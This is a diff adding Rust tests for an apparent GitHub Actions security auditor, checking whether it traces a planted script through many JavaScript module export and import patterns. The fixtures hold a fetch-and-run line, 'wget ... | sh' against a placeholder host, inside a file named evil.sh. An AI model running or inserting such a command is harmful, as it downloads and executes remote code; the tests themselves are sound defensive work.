@@ -341,7 +341,7 @@ jobs:
         .unwrap();
     assert_eq!(output.status.code(), Some(2));
     let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
-    assert_eq!(report["rules_version"], 6);
+    assert_eq!(report["rules_version"], 7);
     assert_eq!(report["audited_bundled"], 0);
     assert_eq!(report["external_actions_skipped"], 2);
     assert_eq!(report["coverage_complete"], false);
@@ -2231,6 +2231,1287 @@ fn exported_function_parameters_are_not_bound_to_local_calls() {
     })
     .collect();
     assert!(failures.is_empty(), "{failures:#?}");
+}
+
+const MODULE_CJS: &str = "const cp = require('child_process');\nconst fs = require('fs');\nfunction which(tool) { return process.env.TOOLS + '/' + tool; }\n";
+const MODULE_ESM: &str = "import cp from 'child_process';\nimport fs from 'fs';\nfunction which(tool) { return process.env.TOOLS + '/' + tool; }\n";
+const MODULE_RUN: &str = "(script) => cp.spawnSync(which('bash'), [script])";
+const CALLER_CJS: &str = "const path = require('path');\nfunction which(tool) { return process.env.TOOLS + '/' + tool; }\n";
+const CALLER_ESM: &str = "import path from 'path';\n";
+
+#[derive(Debug, PartialEq)]
+enum ModuleOutcome {
+    /// The planted script is scanned and the scan stays complete.
+    Followed,
+    Incomplete,
+    Clean,
+}
+
+/// Audits an action whose `index.js` loads the action's other `files`, with
+/// `evil.sh` planted beside it.
+fn audit_modules(esm: bool, files: &[(&str, String)]) -> ModuleOutcome {
+    let package = if esm {
+        "{ \"type\": \"module\" }\n"
+    } else {
+        "{}\n"
+    };
+    let mut all: Vec<(&str, &str)> = files
+        .iter()
+        .map(|(path, content)| (*path, content.as_str()))
+        .collect();
+    all.extend([
+        ("package.json", package),
+        ("evil.sh", "wget -qO- https://example.com/evil.sh | sh\n"),
+        ("config.json", "{}\n"),
+    ]);
+    let dir = common::repo_with_local_action(&node_action("index.js"), &all);
+    let output = common::pinprick_cmd()
+        .args(["audit", "--no-audited-catalog", "--json"])
+        .arg(dir.path())
+        .output()
+        .unwrap();
+    let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+    let followed = report["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .any(|finding| {
+            finding["source_file"]
+                .as_str()
+                .is_some_and(|source| source.ends_with("evil.sh)"))
+        });
+    match (output.status.code(), report["coverage_complete"].as_bool()) {
+        (Some(1), Some(true)) if followed => ModuleOutcome::Followed,
+        (Some(2), Some(false)) => ModuleOutcome::Incomplete,
+        (Some(0), Some(true)) => ModuleOutcome::Clean,
+        other => panic!("{other:?}: {report}"),
+    }
+}
+
+/// A case's name, whether it is an ES module action, and its files.
+type ModuleCase<'a> = (&'a str, bool, Vec<(&'a str, String)>);
+
+fn module_failures(cases: Vec<ModuleCase<'_>>, expected: &ModuleOutcome) -> Vec<String> {
+    cases
+        .into_iter()
+        .filter_map(|(name, esm, files)| {
+            let outcome = audit_modules(esm, &files);
+            (outcome != *expected).then(|| format!("{name}: {outcome:?}"))
+        })
+        .collect()
+}
+
+#[test]
+fn located_arguments_reach_other_action_files() {
+    let evil = "path.join(__dirname, 'evil.sh')";
+    let evil_esm = "path.join(import.meta.dirname, 'evil.sh')";
+    let caller = |call: &str| format!("{CALLER_CJS}{call}\n");
+    let esm_caller = |call: &str| format!("{CALLER_ESM}{call}\n");
+    let lib = |exports: &str| format!("{MODULE_CJS}{exports}\n");
+    let esm_lib = |exports: &str| format!("{MODULE_ESM}{exports}\n");
+    let cases = vec![
+        (
+            "default re-exported by name",
+            true,
+            vec![
+                ("index.js", esm_caller(&format!("import {{ run }} from './a.js';\nrun({evil_esm});"))),
+                ("a.js", "export { default as run } from './b.js';\n".to_string()),
+                ("b.js", esm_lib("export default function (script) { return cp.spawnSync(which('bash'), [script]); }")),
+            ],
+        ),
+        (
+            "field re-export",
+            false,
+            vec![
+                ("index.js", caller(&format!("require('./a.js').run({evil});"))),
+                ("a.js", "exports.run = require('./b.js').start;\n".to_string()),
+                ("b.js", lib(&format!("exports.start = {MODULE_RUN};"))),
+            ],
+        ),
+        (
+            "field of module.exports",
+            false,
+            vec![
+                ("index.js", caller(&format!("require('./lib.js').run({evil});"))),
+                ("lib.js", lib(&format!("module.exports.run = {MODULE_RUN};"))),
+            ],
+        ),
+        (
+            "export defined with a value",
+            false,
+            vec![
+                ("index.js", caller(&format!("require('./lib.js').run({evil});"))),
+                ("lib.js", lib(&format!("Object.defineProperty(exports, 'run', {{ value: {MODULE_RUN} }});"))),
+            ],
+        ),
+        (
+            "export reset to null",
+            false,
+            vec![
+                ("index.js", caller(&format!("require('./lib.js').run({evil});"))),
+                ("lib.js", lib(&format!("exports.run = null;\nexports.run = {MODULE_RUN};"))),
+            ],
+        ),
+        (
+            "export reset to undefined",
+            false,
+            vec![
+                ("index.js", caller(&format!("require('./lib.js').run({evil});"))),
+                ("lib.js", lib(&format!("exports.run = undefined;\nexports.run = {MODULE_RUN};"))),
+            ],
+        ),
+        (
+            "destructured with a default",
+            false,
+            vec![
+                ("index.js", caller(&format!("const {{ run = () => 0 }} = require('./lib.js');\nrun({evil});"))),
+                ("lib.js", lib(&format!("exports.run = {MODULE_RUN};"))),
+            ],
+        ),
+        (
+            "computed field call",
+            false,
+            vec![
+                ("index.js", caller(&format!("const lib = require('./lib.js');\nlib['run']({evil});"))),
+                ("lib.js", lib(&format!("exports.run = {MODULE_RUN};"))),
+            ],
+        ),
+        (
+            "call into a module loaded earlier",
+            false,
+            vec![
+                ("index.js", caller(&format!("require('./b.js');\nconst {{ run }} = require('./a.js');\nrun({evil});"))),
+                ("a.js", "const b = require('./b.js');\nexports.run = (script) => b.start(script);\n".to_string()),
+                ("b.js", lib(&format!("exports.start = {MODULE_RUN};"))),
+            ],
+        ),
+        (
+            "module compared and read",
+            false,
+            vec![
+                ("index.js", caller(&format!("const {{ run }} = require('./lib.js');\nrun({evil});"))),
+                ("lib.js", lib(&format!("if (require.main === module) {{ console.log(module.id); }}\nexports.run = {MODULE_RUN};"))),
+            ],
+        ),
+        (
+            "re-export from a located file",
+            false,
+            vec![
+                ("index.js", caller(&format!("const {{ run }} = require('./a.js');\nrun({evil});"))),
+                ("a.js", "const path = require('path');\nconsole.log(path.join(__dirname, 'a.txt'));\nmodule.exports = require('./b.js');\n".to_string()),
+                ("b.js", lib(&format!("exports.run = {MODULE_RUN};"))),
+            ],
+        ),
+        (
+            "destructured",
+            false,
+            vec![
+                ("index.js", caller(&format!("const {{ run }} = require('./lib.js');\nrun({evil});"))),
+                ("lib.js", lib(&format!("exports.run = {MODULE_RUN};"))),
+            ],
+        ),
+        (
+            "module object",
+            false,
+            vec![
+                ("index.js", caller(&format!("const lib = require('./lib');\nlib.run({evil});"))),
+                ("lib.js", lib("exports.run = function (script) { return cp.spawnSync(which('bash'), [script]); };")),
+            ],
+        ),
+        (
+            "module function",
+            false,
+            vec![
+                ("index.js", caller(&format!("require('./lib')({evil});"))),
+                ("lib.js", lib(&format!("module.exports = {MODULE_RUN};"))),
+            ],
+        ),
+        (
+            "object of exports",
+            false,
+            vec![
+                ("index.js", caller(&format!("require('./lib.js').run({evil});"))),
+                ("lib.js", lib("function run(script) { return cp.spawnSync(which('bash'), [script]); }\nmodule.exports = { run };")),
+            ],
+        ),
+        (
+            "command string",
+            false,
+            vec![
+                ("index.js", caller(&format!("const {{ run }} = require('./lib.js');\nrun({evil});"))),
+                ("lib.js", lib("exports.run = (script) => cp.execSync('bash ' + script);")),
+            ],
+        ),
+        (
+            "argument vector",
+            false,
+            vec![
+                ("index.js", caller(&format!("const {{ start }} = require('./lib.js');\nstart(which('bash'), [{evil}]);"))),
+                ("lib.js", lib("exports.start = (program, args) => cp.spawnSync(program, args);")),
+            ],
+        ),
+        (
+            "alias",
+            false,
+            vec![
+                ("index.js", caller(&format!("const lib = require('./lib.js');\nconst run = lib.run;\nrun({evil});"))),
+                ("lib.js", lib(&format!("exports.run = {MODULE_RUN};"))),
+            ],
+        ),
+        (
+            "two hops",
+            false,
+            vec![
+                ("index.js", caller(&format!("const {{ run }} = require('./a.js');\nrun({evil});"))),
+                ("a.js", "const b = require('./b.js');\nexports.run = (script) => b.start(script);\n".to_string()),
+                ("b.js", lib(&format!("exports.start = {MODULE_RUN};"))),
+            ],
+        ),
+        (
+            "re-export",
+            false,
+            vec![
+                ("index.js", caller(&format!("const {{ run }} = require('./a.js');\nrun({evil});"))),
+                ("a.js", "module.exports = require('./b.js');\n".to_string()),
+                ("b.js", lib(&format!("exports.run = {MODULE_RUN};"))),
+            ],
+        ),
+        (
+            "callee in a subdirectory",
+            false,
+            vec![
+                ("index.js", caller("const { run } = require('./lib/helper.js');\nrun(path.join(__dirname, 'scripts', 'evil.sh'));")),
+                ("lib/helper.js", lib(&format!("exports.run = {MODULE_RUN};"))),
+                ("scripts/evil.sh", "wget -qO- https://example.com/evil.sh | sh\n".to_string()),
+            ],
+        ),
+        (
+            "caller in a subdirectory",
+            false,
+            vec![
+                ("index.js", "require('./src/main.js');\n".to_string()),
+                ("src/main.js", caller("const { run } = require('../lib.js');\nrun(path.join(__dirname, '..', 'evil.sh'));")),
+                ("lib.js", lib(&format!("exports.run = {MODULE_RUN};"))),
+            ],
+        ),
+        (
+            "TypeScript CommonJS",
+            false,
+            vec![
+                ("index.js", "\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nconst path = require(\"path\");\nconst helper_1 = require(\"./lib\");\n(0, helper_1.run)(path.join(__dirname, \"evil.sh\"));\n".to_string()),
+                ("lib.js", format!("\"use strict\";\nObject.defineProperty(exports, \"__esModule\", {{ value: true }});\nexports.run = void 0;\n{MODULE_CJS}function run(script) {{ return cp.spawnSync(which('bash'), [script]); }}\nexports.run = run;\n")),
+            ],
+        ),
+        (
+            "named import",
+            true,
+            vec![
+                ("index.js", esm_caller(&format!("import {{ run }} from './lib.js';\nrun({evil_esm});"))),
+                ("lib.js", esm_lib("export function run(script) { return cp.spawnSync(which('bash'), [script]); }")),
+            ],
+        ),
+        (
+            "default import",
+            true,
+            vec![
+                ("index.js", esm_caller(&format!("import run from './lib.js';\nrun({evil_esm});"))),
+                ("lib.js", esm_lib("export default function (script) { return cp.spawnSync(which('bash'), [script]); }")),
+            ],
+        ),
+        (
+            "default named as default",
+            true,
+            vec![
+                ("index.js", esm_caller(&format!("import {{ default as run }} from './lib.js';\nrun({evil_esm});"))),
+                ("lib.js", esm_lib("export default function (script) { return cp.spawnSync(which('bash'), [script]); }")),
+            ],
+        ),
+        (
+            "namespace default",
+            true,
+            vec![
+                ("index.js", esm_caller(&format!("import * as lib from './lib.js';\nlib.default({evil_esm});"))),
+                ("lib.js", esm_lib("export default function (script) { return cp.spawnSync(which('bash'), [script]); }")),
+            ],
+        ),
+        (
+            "namespace import",
+            true,
+            vec![
+                ("index.js", esm_caller(&format!("import * as lib from './lib.js';\nlib.run({evil_esm});"))),
+                ("lib.js", esm_lib(&format!("export const run = {MODULE_RUN};"))),
+            ],
+        ),
+        (
+            "default and named exports",
+            true,
+            vec![
+                ("index.js", esm_caller(&format!("import {{ run }} from './lib.js';\nrun({evil_esm});"))),
+                ("lib.js", esm_lib("export default function main() { return 0; }\nexport function run(script) { return cp.spawnSync(which('bash'), [script]); }")),
+            ],
+        ),
+        (
+            "default object",
+            true,
+            vec![
+                ("index.js", esm_caller(&format!("import api from './lib.js';\napi.run({evil_esm});"))),
+                ("lib.js", esm_lib("function run(script) { return cp.spawnSync(which('bash'), [script]); }\nexport default { run };")),
+            ],
+        ),
+        (
+            "named re-export",
+            true,
+            vec![
+                ("index.js", esm_caller(&format!("import {{ run }} from './a.js';\nrun({evil_esm});"))),
+                ("a.js", "export { run } from './b.js';\n".to_string()),
+                ("b.js", esm_lib("export function run(script) { return cp.spawnSync(which('bash'), [script]); }")),
+            ],
+        ),
+        (
+            "star re-export",
+            true,
+            vec![
+                ("index.js", esm_caller(&format!("import {{ run }} from './a.js';\nrun({evil_esm});"))),
+                ("a.js", "export * from './b.js';\n".to_string()),
+                ("b.js", esm_lib("export function run(script) { return cp.spawnSync(which('bash'), [script]); }")),
+            ],
+        ),
+        (
+            "awaited dynamic import",
+            true,
+            vec![
+                ("index.js", esm_caller(&format!("const lib = await import('./lib.js');\nlib.run({evil_esm});"))),
+                ("lib.js", esm_lib(&format!("export const run = {MODULE_RUN};"))),
+            ],
+        ),
+    ];
+    let failures = module_failures(cases, &ModuleOutcome::Followed);
+    assert!(failures.is_empty(), "{failures:#?}");
+}
+
+#[test]
+fn uncertain_cross_module_calls_fail_closed() {
+    let evil = "path.join(__dirname, 'evil.sh')";
+    let evil_esm = "path.join(import.meta.dirname, 'evil.sh')";
+    let caller = |call: &str| format!("{CALLER_CJS}{call}\n");
+    let lib = |exports: &str| format!("{MODULE_CJS}{exports}\n");
+    let run_lib = lib(&format!("exports.run = {MODULE_RUN};"));
+    let cases = vec![
+        (
+            "destructured function stored",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!(
+                        "const {{ run }} = require('./lib.js');\nconst runners = [run];\nrunners[0]({evil});"
+                    )),
+                ),
+                ("lib.js", run_lib.clone()),
+            ],
+        ),
+        (
+            "imported function stored",
+            true,
+            vec![
+                (
+                    "index.js",
+                    format!(
+                        "{CALLER_ESM}import {{ run }} from './lib.js';\nconst runners = [run];\nrunners[0]({evil_esm});\n"
+                    ),
+                ),
+                (
+                    "lib.js",
+                    format!("{MODULE_ESM}export const run = {MODULE_RUN};\n"),
+                ),
+            ],
+        ),
+        (
+            "alias stored",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!(
+                        "const lib = require('./lib.js');\nconst run = lib.run;\nconst runners = [run];\nrunners[0]({evil});"
+                    )),
+                ),
+                ("lib.js", run_lib.clone()),
+            ],
+        ),
+        (
+            "exports replaced by a call result",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!("require('./lib.js').run({evil});")),
+                ),
+                (
+                    "lib.js",
+                    lib(&format!(
+                        "function build() {{ return {{ run: {MODULE_RUN} }}; }}\nexports.run = () => 0;\nmodule.exports = build();"
+                    )),
+                ),
+            ],
+        ),
+        (
+            "destructured parameter",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!(
+                        "const {{ run }} = require('./lib.js');\nrun({{ script: {evil} }});"
+                    )),
+                ),
+                (
+                    "lib.js",
+                    lib("exports.run = ({ script }) => cp.spawnSync(which('bash'), [script]);"),
+                ),
+            ],
+        ),
+        (
+            "rest parameter",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!(
+                        "const {{ run }} = require('./lib.js');\nrun({evil});"
+                    )),
+                ),
+                (
+                    "lib.js",
+                    lib("exports.run = (...scripts) => cp.spawnSync(which('bash'), scripts);"),
+                ),
+            ],
+        ),
+        (
+            "arguments object",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!(
+                        "const {{ run }} = require('./lib.js');\nrun({evil});"
+                    )),
+                ),
+                (
+                    "lib.js",
+                    lib(
+                        "exports.run = function () { return cp.spawnSync(which('bash'), [arguments[0]]); };",
+                    ),
+                ),
+            ],
+        ),
+        (
+            "unresolved export with a rest parameter",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!("require('./lib.js').run({evil});")),
+                ),
+                (
+                    "lib.js",
+                    lib(
+                        "Object.assign(module.exports, { run: (...scripts) => cp.spawnSync(which('bash'), scripts) });",
+                    ),
+                ),
+            ],
+        ),
+        (
+            "unresolved export reading its arguments",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!("require('./lib.js').run({evil});")),
+                ),
+                (
+                    "lib.js",
+                    lib(
+                        "Object.assign(module.exports, { run: function () { return cp.spawnSync(which('bash'), [arguments[0]]); } });",
+                    ),
+                ),
+            ],
+        ),
+        (
+            "namespace re-export",
+            true,
+            vec![
+                (
+                    "index.js",
+                    format!("{CALLER_ESM}import {{ api }} from './a.js';\napi.run({evil_esm});\n"),
+                ),
+                ("a.js", "export * as api from './b.js';\n".to_string()),
+                (
+                    "b.js",
+                    format!("{MODULE_ESM}export const run = {MODULE_RUN};\n"),
+                ),
+            ],
+        ),
+        (
+            "function export with assigned fields",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!("require('./lib.js').run({evil});")),
+                ),
+                (
+                    "lib.js",
+                    lib(&format!(
+                        "const main = () => 0;\nObject.assign(main, {{ run: {MODULE_RUN} }});\nmodule.exports = main;"
+                    )),
+                ),
+            ],
+        ),
+        (
+            "imported function passed as a callback",
+            true,
+            vec![
+                (
+                    "index.js",
+                    format!(
+                        "{CALLER_ESM}import {{ run }} from './lib.js';\n[{evil_esm}].forEach(run);\n"
+                    ),
+                ),
+                (
+                    "lib.js",
+                    format!("{MODULE_ESM}export const run = {MODULE_RUN};\n"),
+                ),
+            ],
+        ),
+        (
+            "alias passed as a callback",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!(
+                        "const lib = require('./lib.js');\nconst run = lib.run;\n[{evil}].forEach(run);"
+                    )),
+                ),
+                ("lib.js", run_lib.clone()),
+            ],
+        ),
+        (
+            "unknown field call",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!(
+                        "const lib = require('./lib.js');\nlib[process.env.NAME]({evil});"
+                    )),
+                ),
+                (
+                    "lib.js",
+                    lib(&format!(
+                        "module.exports = () => 0;\nmodule.exports.run = {MODULE_RUN};"
+                    )),
+                ),
+            ],
+        ),
+        (
+            "one function under two exports with mixed arguments",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!(
+                        "const lib = require('./lib.js');\nlib(which('bash'), [{evil}]);\nlib.start(which('bash'), path.join(__dirname, 'config.json'));"
+                    )),
+                ),
+                (
+                    "lib.js",
+                    lib(
+                        "function start(program, args) { return cp.spawnSync(program, args); }\nmodule.exports = start;\nmodule.exports.start = start;",
+                    ),
+                ),
+            ],
+        ),
+        (
+            "assigned over a named export",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!("require('./lib.js').run({evil});")),
+                ),
+                (
+                    "lib.js",
+                    lib(&format!(
+                        "exports.run = () => 0;\nObject.assign(module.exports, {{ run: {MODULE_RUN} }});"
+                    )),
+                ),
+            ],
+        ),
+        (
+            "logically assigned exports",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!("require('./lib.js').run({evil});")),
+                ),
+                (
+                    "lib.js",
+                    lib(&format!(
+                        "exports.run = () => 0;\nmodule.exports &&= {{ run: {MODULE_RUN} }};"
+                    )),
+                ),
+            ],
+        ),
+        (
+            "exported call result",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!("require('./lib.js').run({evil});")),
+                ),
+                (
+                    "lib.js",
+                    lib(&format!(
+                        "function make() {{ return {MODULE_RUN}; }}\nexports.run = make();"
+                    )),
+                ),
+            ],
+        ),
+        (
+            "exported variable holding a call result",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!("require('./lib.js').run({evil});")),
+                ),
+                (
+                    "lib.js",
+                    lib(&format!(
+                        "function make() {{ return {MODULE_RUN}; }}\nconst runner = make();\nexports.run = runner;"
+                    )),
+                ),
+            ],
+        ),
+        (
+            "export specifier holding a call result",
+            true,
+            vec![
+                (
+                    "index.js",
+                    format!("{CALLER_ESM}import {{ run }} from './lib.js';\nrun({evil_esm});\n"),
+                ),
+                (
+                    "lib.js",
+                    format!(
+                        "{MODULE_ESM}function make() {{ return {MODULE_RUN}; }}\nconst run = make();\nexport {{ run }};\n"
+                    ),
+                ),
+            ],
+        ),
+        (
+            "computed export beside a named one",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!("require('./lib.js').run({evil});")),
+                ),
+                (
+                    "lib.js",
+                    lib(&format!(
+                        "exports.run = () => 0;\nexports[process.env.NAME || 'run'] = {MODULE_RUN};"
+                    )),
+                ),
+            ],
+        ),
+        (
+            "argument vector used as text",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!(
+                        "const {{ start }} = require('./lib.js');\nstart(which('bash'), [{evil}]);"
+                    )),
+                ),
+                (
+                    "lib.js",
+                    lib("exports.start = (program, args) => cp.execSync(program + ' ' + args);"),
+                ),
+            ],
+        ),
+        (
+            "object argument",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!(
+                        "const {{ run }} = require('./lib.js');\nrun({{ script: {evil} }});"
+                    )),
+                ),
+                (
+                    "lib.js",
+                    lib(
+                        "exports.run = (options) => cp.spawnSync(which('bash'), [options.script]);",
+                    ),
+                ),
+            ],
+        ),
+        (
+            "returned function",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!(
+                        "const {{ make }} = require('./lib.js');\nmake()({evil});"
+                    )),
+                ),
+                (
+                    "lib.js",
+                    lib(&format!("exports.make = () => {MODULE_RUN};")),
+                ),
+            ],
+        ),
+        (
+            "returned object",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!(
+                        "const lib = require('./lib.js');\nconst runner = lib.create();\nrunner.run({evil});"
+                    )),
+                ),
+                (
+                    "lib.js",
+                    lib(&format!(
+                        "exports.create = () => ({{ run: {MODULE_RUN} }});"
+                    )),
+                ),
+            ],
+        ),
+        (
+            "returned callback",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!(
+                        "const lib = require('./lib.js');\n[{evil}].forEach(lib.make());"
+                    )),
+                ),
+                (
+                    "lib.js",
+                    lib(&format!("exports.make = () => {MODULE_RUN};")),
+                ),
+            ],
+        ),
+        (
+            "callback",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!(
+                        "const {{ run }} = require('./lib.js');\n[{evil}].forEach(run);"
+                    )),
+                ),
+                ("lib.js", run_lib.clone()),
+            ],
+        ),
+        (
+            "stored function",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!(
+                        "const runs = [require('./lib.js').run];\nruns[0]({evil});"
+                    )),
+                ),
+                ("lib.js", run_lib.clone()),
+            ],
+        ),
+        (
+            "call method",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!("require('./lib.js').run.call(null, {evil});")),
+                ),
+                ("lib.js", run_lib.clone()),
+            ],
+        ),
+        (
+            "spread arguments",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!(
+                        "const {{ run }} = require('./lib.js');\nrun(...[{evil}]);"
+                    )),
+                ),
+                ("lib.js", run_lib.clone()),
+            ],
+        ),
+        (
+            "constructor",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!(
+                        "const {{ Runner }} = require('./lib.js');\nnew Runner({evil});"
+                    )),
+                ),
+                (
+                    "lib.js",
+                    lib(
+                        "class Runner { constructor(script) { cp.spawnSync(which('bash'), [script]); } }\nexports.Runner = Runner;",
+                    ),
+                ),
+            ],
+        ),
+        (
+            "nested destructuring",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!(
+                        "const {{ api: {{ run }} }} = require('./lib.js');\nrun({evil});"
+                    )),
+                ),
+                (
+                    "lib.js",
+                    lib(&format!(
+                        "exports.run = () => 0;\nexports.api = {{ run: {MODULE_RUN} }};"
+                    )),
+                ),
+            ],
+        ),
+        (
+            "assigned exports",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!("require('./lib.js').run({evil});")),
+                ),
+                (
+                    "lib.js",
+                    lib(&format!(
+                        "Object.assign(module.exports, {{ run: {MODULE_RUN} }});"
+                    )),
+                ),
+            ],
+        ),
+        (
+            "computed export",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!("require('./lib.js').run({evil});")),
+                ),
+                (
+                    "lib.js",
+                    lib(&format!(
+                        "exports[process.env.NAME || 'run'] = {MODULE_RUN};"
+                    )),
+                ),
+            ],
+        ),
+        (
+            "getter export",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!("require('./lib.js').run({evil});")),
+                ),
+                (
+                    "lib.js",
+                    lib(&format!(
+                        "exports.run = () => 0;\nObject.defineProperty(exports, 'run', {{ get: () => {MODULE_RUN} }});"
+                    )),
+                ),
+            ],
+        ),
+        (
+            "built exports",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!("require('./lib.js').run({evil});")),
+                ),
+                (
+                    "lib.js",
+                    lib(&format!(
+                        "function build() {{ return {{ run: {MODULE_RUN} }}; }}\nmodule.exports = build();"
+                    )),
+                ),
+            ],
+        ),
+        (
+            "spread exports",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!("require('./lib.js').run({evil});")),
+                ),
+                (
+                    "lib.js",
+                    lib(&format!(
+                        "const api = {{ run: {MODULE_RUN} }};\nexports.run = () => 0;\nmodule.exports = {{ ...api }};"
+                    )),
+                ),
+            ],
+        ),
+        (
+            "method shorthand export",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!("require('./lib.js').run({evil});")),
+                ),
+                (
+                    "lib.js",
+                    lib(
+                        "module.exports = { run(script) { return cp.spawnSync(which('bash'), [script]); } };",
+                    ),
+                ),
+            ],
+        ),
+        (
+            "unresolved call through a re-export",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!("require('./a.js').run.call(null, {evil});")),
+                ),
+                ("a.js", "module.exports = require('./b.js');\n".to_string()),
+                ("b.js", run_lib.clone()),
+            ],
+        ),
+        (
+            "two callers",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!(
+                        "const {{ run }} = require('./lib.js');\nrun({evil});\nrun(path.join(__dirname, 'config.json'));"
+                    )),
+                ),
+                ("lib.js", run_lib.clone()),
+            ],
+        ),
+        (
+            "two argument vectors",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!(
+                        "const {{ start }} = require('./lib.js');\nstart(which('bash'), [{evil}]);\nstart(which('bash'), [path.join(__dirname, 'config.json')]);"
+                    )),
+                ),
+                (
+                    "lib.js",
+                    lib("exports.start = (program, args) => cp.spawnSync(program, args);"),
+                ),
+            ],
+        ),
+        (
+            "one function under two exports",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!(
+                        "const lib = require('./lib.js');\nlib(which('bash'), [{evil}]);\nlib.start(which('bash'), [path.join(__dirname, 'config.json')]);"
+                    )),
+                ),
+                (
+                    "lib.js",
+                    lib(
+                        "function start(program, args) { return cp.spawnSync(program, args); }\nmodule.exports = start;\nmodule.exports.start = start;",
+                    ),
+                ),
+            ],
+        ),
+        (
+            "parameter located in its own file too",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!(
+                        "const {{ run }} = require('./lib.js');\nrun({evil});"
+                    )),
+                ),
+                (
+                    "lib.js",
+                    lib(
+                        "const path = require('path');\nfunction run(script) { return cp.spawnSync(which('bash'), [script]); }\nexports.run = run;\nrun(path.join(__dirname, 'local.sh'));",
+                    ),
+                ),
+                ("local.sh", "echo local\n".to_string()),
+            ],
+        ),
+        (
+            "reassigned parameter",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!(
+                        "const {{ run }} = require('./lib.js');\nrun({evil});"
+                    )),
+                ),
+                (
+                    "lib.js",
+                    lib(
+                        "exports.run = (script) => { script = String(script); return cp.spawnSync(which('bash'), [script]); };",
+                    ),
+                ),
+            ],
+        ),
+        (
+            "changed argument vector",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!(
+                        "const {{ start }} = require('./lib.js');\nstart(which('bash'), [{evil}]);"
+                    )),
+                ),
+                (
+                    "lib.js",
+                    lib(
+                        "exports.start = (program, args) => { args.unshift('-e'); return cp.spawnSync(program, args); };",
+                    ),
+                ),
+            ],
+        ),
+        (
+            "missing module",
+            false,
+            vec![(
+                "index.js",
+                caller(&format!("require('./missing.js').run({evil});")),
+            )],
+        ),
+        (
+            "unawaited dynamic import",
+            true,
+            vec![
+                (
+                    "index.js",
+                    format!("{CALLER_ESM}import('./lib.js').then((lib) => lib.run({evil_esm}));\n"),
+                ),
+                (
+                    "lib.js",
+                    format!("{MODULE_ESM}export const run = {MODULE_RUN};\n"),
+                ),
+            ],
+        ),
+        // An interop helper other than a property copy may return anything.
+        (
+            "TypeScript default import",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!(
+                        "var __importDefault = (this && this.__importDefault) || function (mod) {{ return (mod && mod.__esModule) ? mod : {{ default: mod }}; }};\nconst lib_1 = __importDefault(require('./lib.js'));\nlib_1.default({evil});"
+                    )),
+                ),
+                ("lib.js", lib(&format!("module.exports = {MODULE_RUN};"))),
+            ],
+        ),
+    ];
+    let failures = module_failures(cases, &ModuleOutcome::Incomplete);
+    assert!(failures.is_empty(), "{failures:#?}");
+}
+
+#[test]
+fn cross_module_calls_without_located_executions_stay_complete() {
+    let config = "path.join(__dirname, 'config.json')";
+    let caller = |call: &str| format!("{CALLER_CJS}{call}\n");
+    let lib = |exports: &str| format!("{MODULE_CJS}{exports}\n");
+    let cases = vec![
+        (
+            "untainted file reading a module field",
+            false,
+            vec![
+                (
+                    "index.js",
+                    "const lib = require('./lib.js');\nconsole.log(lib.version);\n".to_string(),
+                ),
+                (
+                    "lib.js",
+                    lib(&format!(
+                        "exports.version = '1';\nexports.run = {MODULE_RUN};"
+                    )),
+                ),
+            ],
+        ),
+        (
+            "module result given unlocated values",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!(
+                        "const lib = require('./lib.js');\n[1, 2].forEach(lib.make());\nconsole.log({config});"
+                    )),
+                ),
+                (
+                    "lib.js",
+                    lib(&format!("exports.make = () => {MODULE_RUN};")),
+                ),
+            ],
+        ),
+        (
+            "own file passed on",
+            false,
+            vec![
+                ("index.js", caller("require('./lib.js').start(__filename);")),
+                ("lib.js", lib("exports.start = (file) => cp.fork(file);")),
+            ],
+        ),
+        (
+            "built-in module call",
+            false,
+            vec![(
+                "index.js",
+                caller(&format!(
